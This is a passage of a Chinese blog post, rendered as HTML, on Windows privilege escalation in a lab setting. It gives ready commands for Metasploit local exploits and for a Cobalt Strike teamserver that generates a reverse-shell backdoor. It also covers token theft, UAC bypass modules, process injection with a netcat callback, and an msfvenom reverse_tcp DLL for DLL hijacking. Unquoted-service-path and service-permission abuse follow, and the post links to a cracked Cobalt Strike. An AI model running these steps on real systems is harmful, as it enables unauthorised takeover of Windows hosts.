+我们首先使用<code>exploit/windows/local/cve_2021_40449</code>这个模块(演示使用exploit/windows/local/cve_2022_21882_win32k)，然后设置session，session就是之前我们最开始建立的哪个webshell会话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">use exploit/windows/local/cve_2021_40449<br><span class="hljs-built_in">set</span> session 4<br></code></pre></td></tr></table></figure>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725220326158.png" srcset="/img/loading.gif" lazyload></p>
+<p>观察上面这个EXP的选项，我们可以看到<code>Payload options</code>下面的配置就是我们的System权限的Shell应该反弹到哪里，原先的Shell只是一个工具，他帮助我们执行漏洞利用程序，仅此而已。我们新开一个窗口，重新监听，方法和前面一样，如下图所示。</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725220535726.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着，我们在原先的EXP程序中执行<code>run</code>，我们就可以获取System权限的Shell。此时我们已经拥有最高权限，如下图所示。</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725220654587.png" srcset="/img/loading.gif" lazyload></p></li>
+</ul>
+<h5 id="全自动">(3) 全自动</h5>
+<ul>
+<li><p>这里我们运用到了Cobalt
+Strike(简称CS)，CS是一款基于Java的渗透测试工具，主要用于团队作战。要想使用CS，需要有一台服务器(S)，假设靶机为服务器T，我们自己团队的成员比如成员A，成员B，成员C就可以都利用CS登录服务器S进行团队渗透。</p></li>
+<li><p>首先我们在服务器S上运行服务端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">./teamserver &lt;yourServerIP&gt; &lt;TeamPassword&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725234011993.png" srcset="/img/loading.gif" lazyload></p></li>
+<li><p>然后我们运行CS登录服务器</p></li>
+</ul>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725234127036.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>其中别名和用户随意。主机是服务器S的IP，端口默认即可，密码是在服务器S端运行服务端时设置的。</li>
+<li>配置监听器(也就是你的反弹Shell弹到哪里) 依次点击Cobalt
+Strike-&gt;监听器，然后点击添加</li>
+<li><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725234649707.png" srcset="/img/loading.gif" lazyload></li>
+<li>配置监听器，其中名字任意，两个HTTP地址都填写你的服务器S地址</li>
+</ul>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725234802393.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>生成反弹Shell程序
+依次点击攻击-&gt;生成后门-&gt;Windows可执行程序</li>
+</ul>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725234438132.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中的监听器就是上一步中添加的监听器，根据靶机情况选择是否勾选x64选项</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725234916245.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><p>将上一步中生成的后门程序上传到靶机，然后调用。
+可以发现靶机上线，并且权限为Administrator。 <img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725235152562.png" srcset="/img/loading.gif" lazyload></p></li>
+<li><p>提升至System权限。</p>
+<ul>
+<li>使用CS自带功能进行提权</li>
+</ul>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725235323001.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>这里我们的监听器还是选择之前建立的监听器</li>
+</ul>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725235402627.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意，CS为了隐蔽性，默认60秒才会执行命令，可以根据如下图的操作进行取消。</p></li>
+</ul>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725235543401.png" srcset="/img/loading.gif" lazyload></p>
+<p>将其设置为0</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725235603613.png" srcset="/img/loading.gif" lazyload></p>
+<p>提权成功 <img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725235745816.png" srcset="/img/loading.gif" lazyload>
+提权后的网络拓扑图如下 <img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230725235831148.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><p>使用第三方插件进行提权
+很多时候，CS自带的提权功能并不能帮助我们提升至System权限，需要用到第三方插件实现，这里，我们选择"Ladon9.0_巨龙拉冬插件"为例</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230726000142755.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里我们以坏土豆为例进行演示，可以观察到成功提取到System权限</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230726000340188.png" srcset="/img/loading.gif" lazyload></p></li>
+</ul>
+<h4 id="服务命令">3.3.2 服务命令</h4>
+<h5 id="at">(1) AT</h5>
+<p>适用版本：win2003/winxp及以前</p>
+<p>原理：at命令为一个计划命令,
+在指定时间执行相关操作，由于at命令为System权限，其操作本质是创建一个子进程，会继承System权限，进而达到提权的目的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">at 02:27 /interactive cmd<br></code></pre></td></tr></table></figure>
+<p>执行上面的命令后，会在凌晨02:27创建一个System权限的cmd</p>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730022752378.png" srcset="/img/loading.gif" lazyload alt="image-20230730022752378">
+<figcaption aria-hidden="true">image-20230730022752378</figcaption>
+</figure>
+<h5 id="sc">(2) SC</h5>
+<p>适用版本：win2003/winxp及以前</p>
+<p>原理：sc命令负责管理计算机的服务，可以通过其创建一个具有System权限的cmd服务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">sc Create syscmd binPath= <span class="hljs-string">"cmd /K start"</span> <span class="hljs-built_in">type</span>= own <span class="hljs-built_in">type</span>= interact<br></code></pre></td></tr></table></figure>
+<p>运行服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">sc start syscmd<br></code></pre></td></tr></table></figure>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730022936597.png" srcset="/img/loading.gif" lazyload alt="image-20230730022936597">
+<figcaption aria-hidden="true">image-20230730022936597</figcaption>
+</figure>
+<h5 id="ps">(3) PS</h5>
+<p>适用版本: 几乎所有的Server版系统</p>
+<p>PsTools是微软开发的一款工具，用于在远程服务器上执行命令，一般应用于服务器环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">psexec.exe -accepteula -s -i -d cmd<br></code></pre></td></tr></table></figure>
+<p><code>-accepteula</code>：这个参数用于自动接受工具的最终用户许可协议(EULA)。</p>
+<p><code>-s</code>：以系统权限运行远程命令。这样可以在目标计算机上使用System账户执行命令，即拥有最高权限。</p>
+<p><code>-i</code>：这个参数允许在交互式会话中运行命令。通常，此参数与
+<code>-d</code> 参数一起使用。</p>
+<p><code>-d</code>：这个参数指示PsExec在远程计算机上运行命令时不要等待命令完成。如果不使用
+<code>-d</code> 参数，PsExec 将等待远程命令执行完成后才返回。</p>
+<p><code>cmd</code>：这是要在远程计算机上运行的命令。在这个例子中，它是一个简单的
+<code>cmd</code> 命令提示符。</p>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730023230106.png" srcset="/img/loading.gif" lazyload alt="image-20230730023230106">
+<figcaption aria-hidden="true">image-20230730023230106</figcaption>
+</figure>
+<h4 id="进程注入">3.3.3 进程注入</h4>
+<h5 id="pinjector">(1) pinjector</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Bash">pinjector -l <span class="hljs-comment"># 查看所有具有System权限的进程</span><br>pinjector -p &lt;要注入进程的pid&gt; cmd &lt;反弹到哪个端口&gt;<br>nc 192.168.1.1 8888<br></code></pre></td></tr></table></figure>
+<h5 id="msf">(2) MSF</h5>
+<p>获取session后执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">ps <span class="hljs-comment"># 查看进程</span><br>migrate PID <span class="hljs-comment"># 迁移对应PID</span><br></code></pre></td></tr></table></figure>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730041107257.png" srcset="/img/loading.gif" lazyload alt="image-20230730041107257">
+<figcaption aria-hidden="true">image-20230730041107257</figcaption>
+</figure>
+<h4 id="令牌窃取">3.3.4 令牌窃取</h4>
+<h5 id="情景一">(1) 情景一</h5>
+<p>若此时我们的权限较高，比如是Administrator，就可以直接窃取令牌</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Bash">use incognito<br>list_tokens -u<br>impersonate_token <span class="hljs-string">"NT AUTHORITY\SYSTEM"</span><br></code></pre></td></tr></table></figure>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730041503789.png" srcset="/img/loading.gif" lazyload alt="image-20230730041503789">
+<figcaption aria-hidden="true">image-20230730041503789</figcaption>
+</figure>
+<h5 id="情景二">(2) 情景二</h5>
+<p>若此时我们只是普通的Webshell权限，是没办法直接窃取令牌的，需要配合烂土豆窃取令牌</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash">execute -cH -f ./potato.exe <span class="hljs-comment"># 烂土豆</span><br>use incognito<br>list_tokens -u<br>impersonate_token <span class="hljs-string">"NT AUTHORITY\SYSTEM"</span><br></code></pre></td></tr></table></figure>
+<h4 id="uac绕过">3.3.5 UAC绕过</h4>
+<h5 id="使用msf内置模块">(1) 使用MSF内置模块</h5>
+<p>-Test in Win7</p>
+<p>use exploit/windows/local/bypassua</p>
+<p>-Test in Win10</p>
+<p>use exploit/windows/local/ask</p>
+<p>use exploit/windows/local/bypassuac_sluihijack</p>
+<p>use exploit/windows/local/bypassuac_silentcleanup</p>
+<h5 id="使用uacme项目">(2) 使用UACMe项目</h5>
+<p>https://github.com/hfiref0x/UACME</p>
+<p>Akagi64.exe 41 msf1.exe</p>
+<p>Akagi64.exe 编号 调用执行</p>
+<h4 id="dll劫持">3.3.6 DLL劫持</h4>
+<p>DLL查找顺序</p>
+<ol type="1">
+<li><p>应用程序加载的目录</p></li>
+<li><p><code>C:\Windows\System32</code></p></li>
+<li><p><code>C:\Windows\System</code></p></li>
+<li><p><code>C:\Windows</code></p></li>
+<li><p>当前工作目录Current Working Directory，CWD</p></li>
+<li><p>在PATH环境变量的目录（先系统后用户）</p></li>
+</ol>
+<p>利用火绒剑去分析程序调用了哪些DLL，然后尽量选择在应用程序加载的目录中的DLL，用ChkDllHijack工具判断是否能进行劫持，若能就用MSF生成对应的恶意DLL，进而getsystem</p>
+<p>生成木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.144 LPORT=8888 -f dll -o msf.dll<br></code></pre></td></tr></table></figure>
+<p>将生成的dll进行替换，当受害者点击某软件时，我们就进行了提权</p>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730054535560.png" srcset="/img/loading.gif" lazyload alt="image-20230730054535560">
+<figcaption aria-hidden="true">image-20230730054535560</figcaption>
+</figure>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730060221223.png" srcset="/img/loading.gif" lazyload alt="image-20230730060221223">
+<figcaption aria-hidden="true">image-20230730060221223</figcaption>
+</figure>
+<h4 id="服务相关">3.3.7 服务相关</h4>
+<h5 id="服务路径引号问题">(1) 服务路径引号问题</h5>
+<p>过程：检测有路径问题的服务--&gt;上传恶意程序--&gt;监听--&gt;重启服务</p>
+<p>检测项目：JAWS</p>
+<p>https://github.com/PowerShellMafia/PowerSploit</p>
+<p>https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</p>
+<p>检测命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">"Auto"</span> |findstr /i /v <span class="hljs-string">"C:\Windows\\"</span> |findstr /i /v <span class="hljs-string">""</span><span class="hljs-string">"</span><br></code></pre></td></tr></table></figure>
+<p>上传我们的恶意程序,然后执行如下命令重启服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">sc start <span class="hljs-string">"xxx"</span><br></code></pre></td></tr></table></figure>
+<figure>
+<img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230730060952984.png" srcset="/img/loading.gif" lazyload alt="image-20230730060952984">
+<figcaption aria-hidden="true">image-20230730060952984</figcaption>
+</figure>
+<h5 id="服务权限问题">(2) 服务权限问题</h5>
+<p>原理：若服务的路径正确，但是权限配置不当，导致我们可以更改服务指向的地址，也会出现安全问题</p>
+<p>过程：检测服务权限--&gt;将服务路径指向恶意程序地址——&gt;调用</p>
+<p>相关脚本：</p>
+<p>https://github.com/411Hall/JAWS</p>
+<p>https://github.com/PowerShellMafia/PowerSploit</p>
+<p>sc config "test" binpath="C:.exe"</p>
+<p>sc start test</p>
+<h4 id="其他">3.3.8 其他</h4>
+<p>使用MSF时，可以使用如下的命令自动化提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">getsystem<br></code></pre></td></tr></table></figure>
+<h2 id="四第三方软件">四、第三方软件</h2>
+<h3 id="向日葵">4.1 向日葵</h3>
+<h3 id="teamviewer">4.2 Teamviewer</h3>
+<p>有一定的条件，运行反弹shell的必须至少比IIS权限大 ## 附:
+环境部署/工具</p>
+<h3 id="ofcms">OFCMS</h3>
+<p>docker-compoes.yml文件 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3'</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">web_server:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">zhhhy/ofcms</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span><br></code></pre></td></tr></table></figure> 启动环境:
+<code>docker-compose up -d</code> 后台地址:
+http://192.168.126.144:8080/ofcms-admin/admin/index.html 默认账号与密码:
+admin:123456 ### SQLServer
+https://www.bilibili.com/video/BV1XT4y1C7Gc?t=5.1
+完成上面链接中的步骤后，需要前往Sql Server Configuration
+Manager，找到SQL Server
+网络配置选项，然后将MSSQLSERVER中的TCP/IP协议启用，如下图所示：</p>
+<p><img src="https://d4wn-img.oss-cn-hongkong.aliyuncs.com/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230727202030200.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="cs破解">CS破解</h3>
+<p>https://www.ddosi.org/cobaltstrike-4-5-cracked/</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Security/" class="category-chain-item">Security</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>权限提升</div>
+      <div>https://d4wnnn.github.io/2023/07/23/Security/权限提升/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>D4wn</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/04/AI/%E8%81%9A%E7%B1%BB%E7%AE%97%E6%B3%95/" title="聚类算法">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">聚类算法</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/21/AI/t-SNE%E9%99%8D%E7%BB%B4%E7%AE%97%E6%B3%95/" title="t-SNE降维算法">
+                        <span class="hidden-mobile">t-SNE降维算法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"iQzcdzgtk7S3lKyzUoT3segU-gzGzoHsz","appKey":"mL1QjUEvvzJ9E2xIVz0OuJuj","path":"window.location.pathname","placeholder":"Hello","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"https://iqzcdzgt.lc-cn-n1-shared.com","emojiCDN":"https://valinecdn.bili33.top/","emojiMaps":{"QQ1":"QQ/aini.gif","QQ2":"QQ/aixin.gif","QQ3":"QQ/aoman.gif","QQ4":"QQ/baiyan.gif","QQ5":"QQ/bangbangtang.gif","QQ6":"QQ/baojin.gif","QQ7":"QQ/baoquan.gif","QQ8":"QQ/bishi.gif","QQ9":"QQ/bizui.gif","QQ11":"QQ/cahan.gif","QQ12":"QQ/caidao.gif","QQ13":"QQ/chi.gif","QQ14":"QQ/ciya.gif","QQ15":"QQ/dabing.gif","QQ16":"QQ/daku.gif","QQ17":"QQ/dan.gif","QQ18":"QQ/deyi.gif","QQ19":"QQ/doge.gif","QQ20":"QQ/fadai.gif","QQ21":"QQ/fanu.gif","QQ22":"QQ/fendou.gif","QQ23":"QQ/ganga.gif","QQ24":"QQ/gouyin.gif","QQ25":"QQ/guzhang.gif","QQ26":"QQ/haixiu.gif","QQ27":"QQ/hanxiao.gif","QQ28":"QQ/haobang.gif","QQ29":"QQ/haqian.gif","QQ30":"QQ/hecai.gif","QQ31":"QQ/hexie.gif","QQ32":"QQ/huaixiao.gif","QQ33":"QQ/jie.gif","QQ34":"QQ/jingkong.gif","QQ35":"QQ/jingxi.gif","QQ36":"QQ/jingya.gif","QQ37":"QQ/juhua.gif","QQ38":"QQ/keai.gif","QQ39":"QQ/kelian.gif","QQ40":"QQ/koubi.gif","QQ41":"QQ/ku.gif","QQ42":"QQ/kuaikule.gif","QQ43":"QQ/kulou.gif","QQ44":"QQ/kun.gif","QQ45":"QQ/lanqiu.gif","QQ46":"QQ/leiben.gif","QQ47":"QQ/lenghan.gif","QQ48":"QQ/liuhan.gif","QQ49":"QQ/liulei.gif","QQ50":"QQ/nanguo.gif","QQ51":"QQ/OK.gif","QQ52":"QQ/penxue.gif","QQ53":"QQ/piezui.gif","QQ54":"QQ/pijiu.gif","QQ55":"QQ/qiang.gif","QQ56":"QQ/qiaoda.gif","QQ57":"QQ/qinqin.gif","QQ58":"QQ/qiudale.gif","QQ59":"QQ/quantou.gif","QQ60":"QQ/saorao.gif","QQ61":"QQ/se.gif","QQ62":"QQ/shengli.gif","QQ63":"QQ/shouqiang.gif","QQ64":"QQ/shuai.gif","QQ65":"QQ/shui.gif","QQ66":"QQ/tiaopi.gif","QQ67":"QQ/touxiao.gif","QQ68":"QQ/tu.gif","QQ69":"QQ/tuosai.gif","QQ70":"QQ/weiqu.gif","QQ71":"QQ/weixiao.gif","QQ72":"QQ/woshou.gif","QQ73":"QQ/wozuimei.gif","QQ74":"QQ/wunai.gif","QQ75":"QQ/xia.gif","QQ76":"QQ/xiaojiujie.gif","QQ77":"QQ/xiaoku.gif","QQ78":"QQ/xiaoyanger.gif","QQ79":"QQ/xieyanxiao.gif","QQ80":"QQ/xigua.gif","QQ81":"QQ/xu.gif","QQ82":"QQ/yangtuo.gif","QQ83":"QQ/yinxian.gif","QQ84":"QQ/yiwen.gif","QQ85":"QQ/youhengheng.gif","QQ86":"QQ/youling.gif","QQ87":"QQ/yun.gif","QQ88":"QQ/zaijian.gif","QQ89":"QQ/zhayanjian.gif","QQ90":"QQ/zhemo.gif","QQ91":"QQ/zhouma.gif","QQ92":"QQ/zhuakuang.gif","QQ93":"QQ/zuohengheng.gif"},"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/d4wnnn" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="tencent://message/?uin=2638177031" target="_blank" rel="nofollow noopener"><span>联系我</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
